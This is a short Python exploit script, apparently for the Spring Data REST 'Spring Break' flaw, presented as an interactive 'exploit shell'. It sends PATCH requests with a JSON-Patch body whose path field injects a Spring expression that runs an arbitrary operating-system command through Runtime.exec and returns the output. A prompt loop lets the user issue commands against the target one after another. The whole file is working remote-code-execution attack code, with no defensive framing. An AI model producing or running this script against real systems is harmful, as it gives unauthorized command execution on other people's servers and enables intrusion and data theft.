import requests
import argparse

def exploit(url, cmd):
    headers = {
        'Content-Type': 'application/json-patch+json'
    }
    payload = [{
        "op": "replace",
        "path": "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"" + cmd + "\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x",
        "value": "pwned"
    }]

    try:
        response = requests.patch(url, json=payload, headers=headers)
        output = str(response.text)
        output_list = output.split("\n")
        # remove the the line which starts with {"cause":
        for i in range(len(output_list)):
            if output_list[i].startswith('{"cause":'):
                output_list[i] = ""
        output = "\n".join(output_list)
        return output
    except requests.exceptions.RequestException as e:
        print("Failed to connect to the server:", e)

def main():
    parser = argparse.ArgumentParser(description="Spring Break Exploit Shell")
    parser.add_argument("--ip", help="IP address of the vulnerable application", default="localhost")
    parser.add_argument("--port", help="Port of the vulnerable application", type=int, default=8090)
    args = parser.parse_args()

    # Construct the URL using the IP and port
    url = f"http://{args.ip}:{args.port}/entity/1"

    print("Spring Break Exploit Shell")
    print(f"Attacking to {url}...")
    print("Type 'exit' to quit.")
    
    while True:
        cmd = input("springbreak> ")
        if cmd.lower() == 'exit':
            break
        output = exploit(url, cmd)
        print(output, "\n")

if __name__ == "__main__":
    main()
